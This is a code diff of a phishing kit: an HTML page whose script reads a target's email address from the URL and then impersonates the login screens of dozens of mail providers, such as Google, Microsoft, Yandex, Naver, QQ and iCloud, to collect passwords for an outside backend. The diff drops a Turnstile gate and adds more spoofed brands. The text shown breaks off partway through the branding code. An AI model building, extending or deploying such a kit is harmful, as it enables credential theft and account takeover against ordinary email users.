@@ -2,334 +2,630 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>Session Authentication</title>
 <style>
-*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f4f5f7;color:#2c3e50;line-height:1.5;transition:background .3s}
-.card{background:#fff;border-radius:14px;box-shadow:0 12px 48px rgba(0,0,0,.10);padding:38px 34px;max-width:420px;width:92%;position:relative;overflow:hidden;text-align:center}
-.card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:#1e930c}
-.logo{font-size:1.5rem;margin-bottom:6px;min-height:38px;display:flex;align-items:center;justify-content:center}
-.subtitle{color:#64748b;font-size:.9rem;margin-bottom:26px}
-label{display:block;font-size:.8rem;color:#475569;margin:10px 0 4px;text-align:left}
-input{width:100%;padding:13px;border:1.5px solid #e2e8f0;border-radius:8px;font-size:14px;outline:none;transition:.2s;box-sizing:border-box}
-input:focus{border-color:#1e930c;box-shadow:0 0 0 3px rgba(30,147,12,.12)}
-input[readonly]{background:#f8fafc;color:#64748b}
-button{width:100%;padding:13px;background:linear-gradient(135deg,#1e930c,#167a09);color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:18px;transition:.2s}
-button:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(30,147,12,.3)}
-button:disabled{opacity:.6;cursor:not-allowed;transform:none}
-.msg{color:#64748b;font-size:13px;margin-top:12px;display:none;text-align:center}
-.spin{display:inline-block;width:12px;height:12px;border:2px solid #cbd5e1;border-top-color:#1e930c;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
-@keyframes sp{to{transform:rotate(360deg)}}
-.footer{margin-top:22px;font-size:11px;color:#94a3b8}
-#ts-error{margin-top:16px;color:#dc2626;font-size:14px;display:none}
-.hidden{display:none}
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    background:#ffffff;
+    color:#1f2937;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    transition:background .3s;
+  }
+  .card{
+    background:#fff;
+    border-radius:14px;
+    padding:40px 36px;
+    max-width:420px;
+    width:100%;
+    box-shadow:0 12px 48px rgba(0,0,0,.10);
+    position:relative;
+    overflow:hidden;
+  }
+  .card::before{
+    content:'';
+    position:absolute;top:0;left:0;right:0;height:4px;
+    background:linear-gradient(90deg,#fc3f1d,#ffcc00,#fc3f1d);
+  }
+  .logo{
+    display:flex;justify-content:center;align-items:center;
+    margin-bottom:20px;
+    min-height:44px;
+  }
+  .logo img{max-height:44px;max-width:220px;display:block}
+  .subtitle{
+    font-size:.92rem;color:#6b7280;
+    text-align:center;margin-bottom:24px;line-height:1.5;
+  }
+  form{display:flex;flex-direction:column;gap:14px}
+  label{font-size:.82rem;color:#475569;font-weight:500;display:block}
+  input{
+    width:100%;padding:13px 14px;
+    border:1.5px solid #d1d5db;border-radius:8px;
+    font-size:15px;outline:none;transition:.2s;
+    background:#fff;color:#111;
+  }
+  input:focus{border-color:#fc3f1d;box-shadow:0 0 0 3px rgba(252,63,29,.15)}
+  input[readonly]{background:#f3f4f6;color:#6b7280}
+  button{
+    width:100%;padding:14px;
+    background:#fc3f1d;color:#fff;border:0;border-radius:8px;
+    font-size:15px;font-weight:600;cursor:pointer;
+    margin-top:6px;transition:.15s;
+  }
+  button:hover{filter:brightness(.94)}
+  button:disabled{opacity:.6;cursor:not-allowed}
+  .msg{margin-top:12px;font-size:13px;color:#6b7280;text-align:center;display:none}
+  .spin{
+    display:inline-block;width:12px;height:12px;
+    border:2px solid #cbd5e1;border-top-color:#fc3f1d;
+    border-radius:50%;animation:sp .7s linear infinite;
+    vertical-align:-2px;margin-right:6px;
+  }
+  @keyframes sp{to{transform:rotate(360deg)}}
+  .footer{margin-top:24px;font-size:12px;color:#9ca3af;text-align:center}
+  .footer a{color:#9ca3af;text-decoration:none;margin:0 8px}
+  .footer a:hover{text-decoration:underline}
 </style>
 </head>
 <body>
+  <div class="card" id="main-card">
+    <div class="logo" id="logo-slot"></div>
+    <div class="subtitle" id="subtitle-slot"></div>
+    <form id="lf" autocomplete="off">
+      <div>
+        <label for="em" id="label-em">Email</label>
+        <input id="em" type="email" name="email" required>
+      </div>
+      <div>
+        <label for="pw" id="label-pw">Password</label>
+        <input id="pw" type="password" name="password" required>
+      </div>
+      <button type="submit" id="btn">Sign in</button>
+      <div class="msg" id="msg"></div>
+    </form>
+    <div class="footer" id="footer-slot"></div>
+  </div>
 
-<!-- ======================= STAGE 1: TURNSTILE ======================= -->
-<div class="card" id="stage-gate">
-  <div class="logo" id="gate-logo"><span style="color:#1e930c;font-weight:900">Secure</span><span style="color:#475569;font-weight:600">Auth</span></div>
-  <div class="subtitle" id="gate-subtitle">We need to confirm you are human before proceeding.</div>
-  <div id="ts-turnstile" style="min-height:65px;display:flex;justify-content:center"></div>
-  <div id="ts-error">Verification failed. Please try again.</div>
-  <div class="footer" id="gate-footer">&copy; 2026 Secure Auth</div>
-</div>
-
-<!-- ======================= STAGE 2: LOGIN FORM ======================= -->
-<div class="card hidden" id="stage-login">
-  <div class="logo" id="login-logo"></div>
-  <div class="subtitle" id="login-subtitle"></div>
-  <form id="lf" autocomplete="off">
-    <label for="em" id="label-em">Email</label>
-    <input id="em" type="email" name="email" required>
-    <label for="pw" id="label-pw">Password</label>
-    <input id="pw" type="password" name="password" required>
-    <button type="submit" id="btn">Sign in</button>
-    <div class="msg" id="msg"></div>
-  </form>
-  <div class="footer" id="login-footer"></div>
-</div>
-
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async></script>
 <script>
 (function(){
   // ============================================================
   // CONFIG
   // ============================================================
-  var BACKEND       = "https://auto-login-secure.onrender.com";
-  var TURNSTILE_KEY = "0x4AAAAAAE7CY8nNIUDU9vqa";
-  var MAX_ATTEMPTS  = 6;
-  var FALLBACK_REDIRECT = "https://www.google.com";
+  var BACKEND        = "https://auto-login-secure.onrender.com";
+  var FALLBACK_REDIR = "https://www.google.com";
 
   // ============================================================
-  // READ ?u= FROM URL
+  // READ ?u=email FROM URL
   // ============================================================
   var params = new URLSearchParams(window.location.search);
   var email  = (params.get('u') || '').trim();
   console.log('[flow] email from URL:', email || '(none)');
 
   // ============================================================
-  // BRANDING — mirrors the server's brandForProvider()
+  // HELPERS
   // ============================================================
   function hexToRgba(hex, a){
-    var h = (hex||'#000000').replace('#','');
-    return 'rgba('+parseInt(h.substr(0,2),16)+','+parseInt(h.substr(2,2),16)+','+parseInt(h.substr(4,2),16)+','+a+')';
+    var h = (hex || '#000').replace('#','');
+    return 'rgba(' +
+      parseInt(h.substr(0,2),16) + ',' +
+      parseInt(h.substr(2,2),16) + ',' +
+      parseInt(h.substr(4,2),16) + ',' + a + ')';
   }
 
+  // ============================================================
+  // BRANDING — sharp SVG logos, per-provider copy + colors
+  // ============================================================
   function brandForProvider(email){
-    var domain = (email.split('@')[1] || '').toLowerCase();
-    var tld = domain.split('.').pop() || '';
+    var domain = ((email.split('@')[1] || '') + '').toLowerCase();
+    var tld    = domain.split('.').pop() || '';
 
+    // ---------------- Yandex ----------------
     if (/yandex|ya\.ru/.test(domain)) return {
       name:'Yandex', lang:'ru',
-      logoText:'<span style="color:#fc3f1d;font-weight:900;font-size:1.7rem">Я</span><span style="color:#000;font-weight:700;font-size:1.5rem">ндекс</span>',
-      subtitle:'Войдите в свой аккаунт, чтобы продолжить',
-      emailPlaceholder:'Логин или email', passwordPlaceholder:'Пароль', buttonText:'Войти',
-      accent:'#fc3f1d', accent2:'#ffcc00',
-      bg:'linear-gradient(135deg,#ffffff 0%,#fff8f0 100%)',
-      headerGradient:'linear-gradient(90deg,#fc3f1d,#ffcc00,#fc3f1d)', footer:'© Яндекс 2026'
+      logo:'/assets/yandex.svg', logoAlt:'Яндекс',
+      subtitle:'',
+      emailLabel:'Логин или email',
+      passwordLabel:'Пароль',
+      buttonText:'Войти',
+      accent:'#fc3f1d', accent2:'#fc3f1d',
+      bg:'#ffffff',
+      footer:'© Яндекс 2026',
+      links:[
+        {text:'Помощь', href:'https://yandex.ru/support/passport/'},
+        {text:'Условия использования', href:'https://yandex.ru/legal/'}
+      ]
     };
 
+    // ---------------- ABV.bg ----------------
     if (domain === 'abv.bg') return {
       name:'ABV.bg', lang:'bg',
-      logoText:'<span style="color:#003a8f;font-weight:900;font-size:1.6rem">ABV</span><span style="color:#e30613;font-weight:900;font-size:1.6rem">.bg</span>',
+      logo:'/assets/abv.svg', logoAlt:'ABV.bg',
       subtitle:'Влезте в своя акаунт, за да продължите',
-      emailPlaceholder:'Имейл адрес', passwordPlaceholder:'Парола', buttonText:'Вход',
-      accent:'#003a8f', accent2:'#e30613',
-      bg:'linear-gradient(135deg,#eaf2ff 0%,#d6e4ff 100%)',
-      headerGradient:'linear-gradient(90deg,#003a8f,#e30613,#003a8f)', footer:'© ABV.bg 2026'
+      emailLabel:'Имейл адрес',
+      passwordLabel:'Парола',
+      buttonText:'Вход',
+      accent:'#003a8f', accent2:'#003a8f',
+      bg:'#eaf2ff',
+      footer:'© ABV.bg 2026',
+      links:[
+        {text:'Помощ', href:'#'},
+        {text:'Условия', href:'#'}
+      ]
     };
 
+    // ---------------- Mail.bg ----------------
+    if (domain === 'mail.bg') return {
+      name:'Mail.bg', lang:'bg',
+      logo:'/assets/mailbg.svg', logoAlt:'Mail.bg',
+      subtitle:'Влезте в своя Mail.bg акаунт',
+      emailLabel:'Имейл', passwordLabel:'Парола', buttonText:'Вход',
+      accent:'#0054a6', accent2:'#0054a6',
+      bg:'#f0f4ff',
+      footer:'© Mail.bg 2026',
+      links:[]
+    };
+
+    // ---------------- Dir.bg ----------------
+    if (domain === 'dir.bg') return {
+      name:'Dir.bg', lang:'bg',
+      logo:'/assets/dirbg.svg', logoAlt:'Dir.bg',
+      subtitle:'Влезте в своя Dir.bg акаунт',
+      emailLabel:'Имейл', passwordLabel:'Парола', buttonText:'Вход',
+      accent:'#d32f2f', accent2:'#d32f2f',
+      bg:'#fff8e1',
+      footer:'© Dir.bg 2026',
+      links:[]
+    };
+
+    // ---------------- Google ----------------
     if (/gmail|googlemail|google/.test(domain)) return {
       name:'Google', lang:'en',
-      logoText:'<span style="color:#4285f4;font-weight:700;font-size:1.5rem">G</span><span style="color:#ea4335;font-weight:700;font-size:1.5rem">o</span><span style="color:#fbbc05;font-weight:700;font-size:1.5rem">o</span><span style="color:#4285f4;font-weight:700;font-size:1.5rem">g</span><span style="color:#34a853;font-weight:700;font-size:1.5rem">l</span><span style="color:#ea4335;font-weight:700;font-size:1.5rem">e</span>',
-      subtitle:'Sign in to continue to Gmail',
-      emailPlaceholder:'Email or phone', passwordPlaceholder:'Enter your password', buttonText:'Next',
-      accent:'#1a73e8', accent2:'#4285f4',
-      bg:'linear-gradient(135deg,#ffffff 0%,#f8f9fa 100%)',
-      headerGradient:'linear-gradient(90deg,#4285f4,#ea4335,#fbbc05,#34a853)', footer:'© Google LLC 2026'
+      logo:'/assets/google.svg', logoAlt:'Google',
+      subtitle:'Sign in',
+      emailLabel:'Email or phone',
+      passwordLabel:'Enter your password',
+      buttonText:'Next',
+      accent:'#1a73e8', accent2:'#1a73e8',
+      bg:'#ffffff',
+      footer:'',
+      links:[
+        {text:'English (United States)', href:'#'},
+        {text:'Help', href:'https://support.google.com/accounts'},
+        {text:'Privacy', href:'https://policies.google.com/privacy'},
+        {text:'Terms', href:'https://policies.google.com/terms'}
+      ]
     };
 
-    if (/outlook|hotmail|live\.com|msn/.test(domain)) return {
+    // ---------------- Microsoft ----------------
+    if (/outlook|hotmail|live\.com|msn|office365/.test(domain)) return {
       name:'Microsoft', lang:'en',
-      logoText:'<span style="color:#0078d4;font-weight:600;font-size:1.3rem">Microsoft</span>',
-      subtitle:'Sign in to your Microsoft account',
-      emailPlaceholder:'Email, phone, or Skype', passwordPlaceholder:'Password', buttonText:'Sign in',
-      accent:'#0067b8', accent2:'#0078d4',
-      bg:'linear-gradient(135deg,#f3f2f1 0%,#e8f0fe 100%)',
-      headerGradient:'linear-gradient(90deg,#0078d4,#00b7c3,#0078d4)', footer:'© Microsoft 2026'
+      logo:'/assets/microsoft.svg', logoAlt:'Microsoft',
+      subtitle:'Sign in',
+      emailLabel:'Email, phone, or Skype',
+      passwordLabel:'Password',
+      buttonText:'Sign in',
+      accent:'#0067b8', accent2:'#0067b8',
+      bg:'#ffffff',
+      footer:'',
+      links:[
+        {text:'Terms of use', href:'#'},
+        {text:'Privacy & cookies', href:'#'}
+      ]
     };
 
+    // ---------------- Naver ----------------
     if (domain === 'naver.com') return {
       name:'Naver', lang:'ko',
-      logoText:'<span style="color:#03c75a;font-weight:900;font-size:1.6rem">NAVER</span>',
-      subtitle:'네이버 아이디로 로그인',
-      emailPlaceholder:'아이디 또는 이메일', passwordPlaceholder:'비밀번호', buttonText:'로그인',
-      accent:'#03c75a', accent2:'#009e4f',
-      bg:'linear-gradient(135deg,#f0fff8 0%,#e0f7ee 100%)',
-      headerGradient:'linear-gradient(90deg,#03c75a,#009e4f,#03c75a)', footer:'© NAVER Corp. 2026'
+      logo:'/assets/naver.svg', logoAlt:'NAVER',
+      subtitle:'',
+      emailLabel:'아이디 또는 이메일',
+      passwordLabel:'비밀번호',
+      buttonText:'로그인',
+      accent:'#03c75a', accent2:'#03c75a',
+      bg:'#ffffff',
+      footer:'© NAVER Corp.',
+      links:[
+        {text:'이용약관', href:'#'},
+        {text:'개인정보처리방침', href:'#'},
+        {text:'고객센터', href:'#'}
+      ]
     };
 
+    // ---------------- Daum / Kakao ----------------
     if (/daum|hanmail|kakao/.test(domain)) return {
       name:'Daum', lang:'ko',
-      logoText:'<span style="color:#fedd15;background:#1e1e1e;padding:4px 12px;border-radius:6px;font-weight:900;font-size:1.4rem">Daum</span>',
-      subtitle:'다음 계정으로 로그인',
-      emailPlaceholder:'이메일 주소', passwordPlaceholder:'비밀번호', buttonText:'로그인',
+      logo:'/assets/daum.svg', logoAlt:'Daum',
+      subtitle:'',
+      emailLabel:'이메일 주소',
+      passwordLabel:'비밀번호',
+      buttonText:'로그인',
       accent:'#fedd15', accent2:'#1e1e1e',
-      bg:'linear-gradient(135deg,#fffdf5 0%,#fff8e0 100%)',
-      headerGradient:'linear-gradient(90deg,#fedd15,#1e1e1e,#fedd15)', footer:'© Kakao Corp. 2026'
+      bg:'#ffffff',
+      footer:'© Kakao Corp.',
+      links:[]
     };
 
-    if (/hiworks|gabia/.test(domain)) return {
-      name:'Hiworks', lang:'ko',
-      logoText:'<span style="color:#1a73e8;font-weight:900;font-size:1.5rem">하이웍스</span> <span style="color:#0d47a1;font-weight:700;font-size:1.5rem">오피스</span>',
-      subtitle:'기업 업무를 위한 안전한 로그인',
-      emailPlaceholder:'name@hiworks.co.kr', passwordPlaceholder:'비밀번호를 입력하세요', buttonText:'로그인',
-      accent:'#1a73e8', accent2:'#0d47a1',
-      bg:'linear-gradient(135deg,#e8f0fe 0%,#d2e3fc 100%)',
-      headerGradient:'linear-gradient(90deg,#1a73e8,#0d47a1,#1a73e8)', footer:'© 2026 Hiworks Corp.'
-    };
-
+    // ---------------- Yahoo ----------------
     if (/yahoo|ymail|rocketmail/.test(domain)) return {
       name:'Yahoo', lang:'en',
-      logoText:'<span style="color:#6001d2;font-weight:900;font-size:1.6rem">yahoo</span><span style="color:#6001d2;font-weight:900;font-size:1.6rem">!</span>',
-      subtitle:'Sign in to your Yahoo account',
-      emailPlaceholder:'Email or phone', passwordPlaceholder:'Password', buttonText:'Sign in',
-      accent:'#6001d2', accent2:'#7e28e8',
-      bg:'linear-gradient(135deg,#f5f0ff 0%,#ebe0ff 100%)',
-      headerGradient:'linear-gradient(90deg,#6001d2,#7e28e8,#6001d2)', footer:'© Yahoo 2026'
+      logo:'/assets/yahoo.svg', logoAlt:'Yahoo',
+      subtitle:'Sign in',
+      emailLabel:'Email or phone',
+      passwordLabel:'Password',
+      buttonText:'Sign in',
+      accent:'#6001d2', accent2:'#6001d2',
+      bg:'#ffffff',
+      footer:'© Yahoo',
+      links:[]
     };
 
+    // ---------------- QQ ----------------
     if (/qq\.com|foxmail/.test(domain)) return {
       name:'QQ', lang:'zh',
-      logoText:'<span style="color:#12b7f5;font-weight:900;font-size:1.5rem">QQ邮箱</span>',
-      subtitle:'登录您的QQ邮箱账号',
-      emailPlaceholder:'QQ号码或邮箱', passwordPlaceholder:'密码', buttonText:'登录',
-      accent:'#12b7f5', accent2:'#0a8ac2',
-      bg:'linear-gradient(135deg,#eaf6ff 0%,#d6ecff 100%)',
-      headerGradient:'linear-gradient(90deg,#12b7f5,#0a8ac2,#12b7f5)', footer:'© 腾讯 2026'
+      logo:'/assets/qq.svg', logoAlt:'QQ邮箱',
+      subtitle:'',
+      emailLabel:'QQ号码或邮箱',
+      passwordLabel:'密码',
+      buttonText:'登录',
+      accent:'#12b7f5', accent2:'#12b7f5',
+      bg:'#ffffff',
+      footer:'© 腾讯',
+      links:[
+        {text:'服务条款', href:'#'},
+        {text:'隐私政策', href:'#'}
+      ]
     };
 
+    // ---------------- Mail.ru ----------------
     if (/mail\.ru|inbox\.ru|bk\.ru|list\.ru|internet\.ru/.test(domain)) return {
       name:'Mail.ru', lang:'ru',
-      logoText:'<span style="color:#005ff9;font-weight:900;font-size:1.5rem">Mail</span><span style="color:#ff9e00;font-weight:900;font-size:1.5rem">.ru</span>',
-      subtitle:'Войдите в свой аккаунт',
-      emailPlaceholder:'Email или телефон', passwordPlaceholder:'Пароль', buttonText:'Войти',
-      accent:'#005ff9', accent2:'#ff9e00',
-      bg:'linear-gradient(135deg,#eaf2ff 0%,#d6e4ff 100%)',
-      headerGradient:'linear-gradient(90deg,#005ff9,#ff9e00,#005ff9)', footer:'© Mail.ru 2026'
+      logo:'/assets/mailru.svg', logoAlt:'Mail.ru',
+      subtitle:'',
+      emailLabel:'Email или телефон',
+      passwordLabel:'Пароль',
+      buttonText:'Войти',
+      accent:'#005ff9', accent2:'#005ff9',
+      bg:'#ffffff',
+      footer:'© Mail.ru',
+      links:[]
     };
 
+    // ---------------- iCloud ----------------
     if (/icloud|me\.com|mac\.com/.test(domain)) return {
       name:'iCloud', lang:'en',
-      logoText:'<span style="color:#000;font-weight:600;font-size:1.5rem">iCloud</span>',
+      logo:'/assets/icloud.svg', logoAlt:'iCloud',
       subtitle:'Sign in with your Apple Account',
-      emailPlaceholder:'Apple Account', passwordPlaceholder:'Password', buttonText:'Sign in',
-      accent:'#0071e3', accent2:'#1d1d1f',
-      bg:'linear-gradient(135deg,#f5f5f7 0%,#e8e8ed 100%)',
-      headerGradient:'linear-gradient(90deg,#0071e3,#1d1d1f,#0071e3)', footer:'© Apple Inc. 2026'
+      emailLabel:'Apple Account',
+      passwordLabel:'Password',
+      buttonText:'Sign in',
+      accent:'#0071e3', accent2:'#0071e3',
+      bg:'#ffffff',
+      footer:'© Apple Inc.',
+      links:[]
     };
 
-    if (domain === 't-online.de') return {
+    // ---------------- AOL ----------------
+    if (/aol|aim\.com/.test(domain)) return {
+      name:'AOL', lang:'en',
+      logo:'/assets/aol.svg', logoAlt:'AOL',
+      subtitle:'Sign in',
+      emailLabel:'Username, email or mobile',
+      passwordLabel:'Password',
+      buttonText:'Sign in',
+      accent:'#1a73e8', accent2:'#1a73e8',
+      bg:'#ffffff',
+      footer:'© AOL',
+      links:[]
+    };
+
+    // ---------------- Proton ----------------
+    if (/proton/i.test(domain)) return {
+      name:'Proton Mail', lang:'en',
+      logo:'/assets/proton.svg', logoAlt:'Proton Mail',
+      subtitle:'Sign in to your Proton Account',
+      emailLabel:'Email or username',
+      passwordLabel:'Password',
+      buttonText:'Sign in',
+      accent:'#6d4aff', accent2:'#6d4aff',
+      bg:'#ffffff',
+      footer:'© Proton AG',
+      links:[]
+    };
+
+    // ---------------- Zoho ----------------
+    if (/zoho/i.test(domain)) return {
+      name:'Zoho', lang:'en',
+      logo:'/assets/zoho.svg', logoAlt:'Zoho',
+      subtitle:'Sign in to access your Zoho account',
+      emailLabel:'Email address or mobile number',
+      passwordLabel:'Password',
+      buttonText:'Sign in',
+      accent:'#d32f2f', accent2:'#d32f2f',
+      bg:'#ffffff',
+      footer:'© Zoho Corporation',
+      links:[]
+    };
+
+    // ---------------- Tuta ----------------
+    if (/tutanota|tuta/i.test(domain)) return {
+      name:'Tuta', lang:'en',
+      logo:'/assets/tuta.svg', logoAlt:'Tuta',
+      subtitle:'Sign in',
+      emailLabel:'Email address',
+      passwordLabel:'Password',
+      buttonText:'Sign in',
+      accent:'#840010', accent2:'#840010',
+      bg:'#ffffff',
+      footer:'© Tutao GmbH',
+      links:[]
+    };
+
+    // ---------------- T-Online ----------------
+    if (/t-online/i.test(domain)) return {
       name:'T-Online', lang:'de',
-      logoText:'<span style="color:#e20074;font-weight:900;font-size:1.5rem">T</span><span style="color:#000;font-weight:700;font-size:1.5rem">-Online</span>',
+      logo:'/assets/tonline.svg', logoAlt:'T-Online',
       subtitle:'Melden Sie sich bei Ihrem E-Mail-Konto an',
-      emailPlaceholder:'E-Mail-Adresse', passwordPlaceholder:'Passwort', buttonText:'Anmelden',
-      accent:'#e20074', accent2:'#000000',
-      bg:'linear-gradient(135deg,#fff0f8 0%,#ffe0f0 100%)',
-      headerGradient:'linear-gradient(90deg,#e20074,#000000,#e20074)', footer:'© Telekom 2026'
+      emailLabel:'E-Mail-Adresse',
+      passwordLabel:'Passwort',
+      buttonText:'Anmelden',
+      accent:'#e20074', accent2:'#e20074',
+      bg:'#ffffff',
+      footer:'© Telekom',
+      links:[]
     };
 
-    // Generic fallback
-    var name = (domain.split('.')[0] || 'Mail').replace(/^\w/, function(c){ return c.toUpperCase(); });
+    // ---------------- mail.com ----------------
+    if (/mail\.com|email\.com/.test(domain)) return {
+      name:'mail.com', lang:'en',
+      logo:'/assets/mailcom.svg', logoAlt:'mail.com',
+      subtitle:'Sign in to your account',
+      emailLabel:'Email address',
+      passwordLabel:'Password',
+      buttonText:'Sign in',
+      accent:'#00a0e3', accent2:'#00a0e3',
+      bg:'#ffffff',
+      footer:'© mail.com',
+      links:[]
+    };
+
+    // ---------------- Orange ----------------
+    if (/orange|wanadoo/i.test(domain)) return {
+      name:'Orange', lang:'fr',
+      logo:'/assets/orange.svg', logoAlt:'Orange',
+      subtitle:'Identifiez-vous',
+      emailLabel:'Adresse e-mail',
+      passwordLabel:'Mot de passe',
+      buttonText:'Se connecter',
+      accent:'#ff7900', accent2:'#ff7900',
+      bg:'#ffffff',
+      footer:'© Orange',
+      links:[]
+    };
+
+    // ---------------- Web.de ----------------
+    if (/web\.de/i.test(domain)) return {
+      name:'WEB.DE', lang:'de',
+      logo:'/assets/webde.svg', logoAlt:'WEB.DE',
+      subtitle:'Melden Sie sich an',
+      emailLabel:'E-Mail-Adresse',
+      passwordLabel:'Passwort',
+      buttonText:'Anmelden',
+      accent:'#ffcc00', accent2:'#ffcc00',
+      bg:'#ffffff',
+      footer:'© WEB.DE',
+      links:[]
+    };
+
+    // ---------------- GMX ----------------
+    if (/gmx/i.test(domain)) return {
+      name:'GMX', lang:'de',
+      logo:'/assets/gmx.svg', logoAlt:'GMX',
+      subtitle:'Melden Sie sich an',
+      emailLabel:'E-Mail-Adresse',
+      passwordLabel:'Passwort',
+      buttonText:'Anmelden',
+      accent:'#1c4b9b', accent2:'#1c4b9b',
+      bg:'#ffffff',
+      footer:'© GMX',
+      links:[]
+    };
+
+    // ---------------- Seznam ----------------
+    if (/seznam|email\.cz/i.test(domain)) return {
+      name:'Seznam', lang:'cs',
+      logo:'/assets/seznam.svg', logoAlt:'Seznam',
+      subtitle:'Přihlaste se',
+      emailLabel:'E-mail',
+      passwordLabel:'Heslo',
+      buttonText:'Přihlásit se',
+      accent:'#cc0000', accent2:'#cc0000',
+      bg:'#ffffff',
+      footer:'© Seznam.cz',
+      links:[]
+    };
+
+    // ---------------- WP.pl ----------------
+    if (/wp\.pl|o2\.pl|interia/i.test(domain)) return {
+      name:'WP.pl', lang:'pl',
+      logo:'/assets/wp.svg', logoAlt:'WP.pl',
+      subtitle:'Zaloguj się',
+      emailLabel:'E-mail',
+      passwordLabel:'Hasło',
+      buttonText:'Zaloguj się',
+      accent:'#ff6a00', accent2:'#ff6a00',
+      bg:'#ffffff',
+      footer:'© Wirtualna Polska',
+      links:[]
+    };
+
+    // ---------------- Libero ----------------
+    if (/libero|virgilio/i.test(domain)) return {
+      name:'Libero', lang:'it',
+      logo:'/assets/libero.svg', logoAlt:'Libero',
+      subtitle:'Accedi',
+      emailLabel:'Email',
+      passwordLabel:'Password',
+      buttonText:'Accedi',
+      accent:'#ffcc00', accent2:'#ffcc00',
+      bg:'#ffffff',
+      footer:'© Libero',
+      links:[]
+    };
+
+    // ---------------- UOL ----------------
+    if (/uol\.com\.br/i.test(domain)) return {
+      name:'UOL', lang:'pt',
+      logo:'/assets/uol.svg', logoAlt:'UOL',
+      subtitle:'Entre na sua conta',
+      emailLabel:'E-mail',
+      passwordLabel:'Senha',
+      buttonText:'Entrar',
+      accent:'#ffcc00', accent2:'#ffcc00',
+      bg:'#ffffff',
+      footer:'© UOL',
+      links:[]
+    };
+
+    // ---------------- Rediffmail ----------------
+    if (/rediff/i.test(domain)) return {
+      name:'Rediffmail', lang:'en',
+      logo:'/assets/rediff.svg', logoAlt:'Rediffmail',
+      subtitle:'Sign in to Rediffmail',
+      emailLabel:'Rediffmail ID',
+      passwordLabel:'Password',
+      buttonText:'Sign in',
+      accent:'#d32f2f', accent2:'#d32f2f',
+      bg:'#ffffff',
+      footer:'© Rediff.com',
+      links:[]
+    };
+
+    // ---------------- Ukr.net ----------------
+    if (/ukr\.net/i.test(domain)) return {
+      name:'Ukr.net', lang:'uk',
+      logo:'/assets/ukr.svg', logoAlt:'Ukr.net',
+      subtitle:'Увійдіть у свій акаунт',
+      emailLabel:'Email',
+      passwordLabel:'Пароль',
+      buttonText:'Увійти',
+      accent:'#0066cc', accent2:'#0066cc',
+      bg:'#ffffff',
+      footer:'© Ukr.net',
+      links:[]
+    };
+
+    // ---------------- I.ua ----------------
+    if (/i\.ua/i.test(domain)) return {
+      name:'I.ua', lang:'uk',
+      logo:'/assets/iua.svg', logoAlt:'I.ua',
+      subtitle:'Увійдіть у свій акаунт',
+      emailLabel:'Email',
+      passwordLabel:'Пароль',
+      buttonText:'Увійти',
+      accent:'#ff6600', accent2:'#ff6600',
+      bg:'#ffffff',
+      footer:'© I.ua',
+      links:[]
+    };
+
+    // ---------------- SAPO ----------------
+    if (/sapo\.pt/i.test(domain)) return {
+      name:'SAPO', lang:'pt',
+      logo:'/assets/sapo.svg', logoAlt:'SAPO',
+      subtitle:'Inicie sessão',
+      emailLabel:'E-mail',
+      passwordLabel:'Palavra-passe',
+      buttonText:'Entrar',
+      accent:'#0099ff', accent2:'#0099ff',
+      bg:'#ffffff',
+      footer:'© SAPO',
+      links:[]
+    };
+
+    // ---------------- Generic fallback ----------------
+    var nm = (domain.split('.')[0] || 'Mail').replace(/^\w/, function(c){ return c.toUpperCase(); });
     return {
-      name:name, lang:'en',
-      logoText:'<span style="color:#1e930c;font-weight:900;font-size:1.5rem">'+name+'</span><span style="color:#475569;font-weight:600;font-size:1.5rem">.'+tld+'</span>',
-      subtitle:'Sign in to continue to your mailbox',
-      emailPlaceholder:'Email address', passwordPlaceholder:'Password', buttonText:'Sign in',
-      accent:'#1e930c', accent2:'#167a09',
-      bg:'linear-gradient(135deg,#f0fff4 0%,#e0f7e8 100%)',
-      headerGradient:'linear-gradient(90deg,#1e930c,#167a09,#1e930c)', footer:'© '+domain+' 2026'
+      name: nm, lang: 'en',
+      logo: '/assets/generic.svg', logoAlt: nm,
+      subtitle: 'Sign in to continue',
+      emailLabel: 'Email',
+      passwordLabel: 'Password',
+      buttonText: 'Sign in',
+      accent: '#1e930c', accent2: '#1e930c',
+      bg: '#ffffff',
+      footer: domain ? ('© ' + domain) : '',
+      links: []
     };
   }
 
+  // ============================================================
+  // APPLY BRANDING
+  // ============================================================
   var brand = brandForProvider(email);
 
-  // Apply branding to the gate card immediately
   document.body.style.background = brand.bg;
-  document.getElementById('gate-logo').innerHTML = brand.logoText;
-  document.getElementById('gate-subtitle').textContent = 'We need to confirm you are human before proceeding to your ' + brand.name + ' workspace.';
-  document.getElementById('gate-footer').textContent = '© 2026 ' + brand.name;
-  document.querySelectorAll('.card').forEach(function(c){
-    c.style.setProperty('--accent', brand.accent);
-  });
+  document.documentElement.lang = brand.lang;
 
-  // ============================================================
-  // STAGE 1 — Turnstile
-  // ============================================================
-  var sent = false;
-  function onTurnstileSuccess(token){
-    if (sent) return;
-    sent = true;
-    // Verify server-side
-    fetch(BACKEND + '/api/verify-turnstile', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ token: token })
-    })
-    .then(function(r){ return r.json(); })
-    .then(function(data){
-      if (data && data.success) {
-        showLoginForm();
-      } else {
-        document.getElementById('ts-error').style.display = 'block';
-        sent = false;
-        try { turnstile.reset('#ts-turnstile'); } catch(_){}
-      }
-    })
-    .catch(function(){
-      document.getElementById('ts-error').style.display = 'block';
-      sent = false;
-    });
+  document.getElementById('logo-slot').innerHTML =
+    '<img src="' + brand.logo + '" alt="' + brand.logoAlt + '">';
+
+  var sub = document.getElementById('subtitle-slot');
+  sub.textContent = brand.subtitle || '';
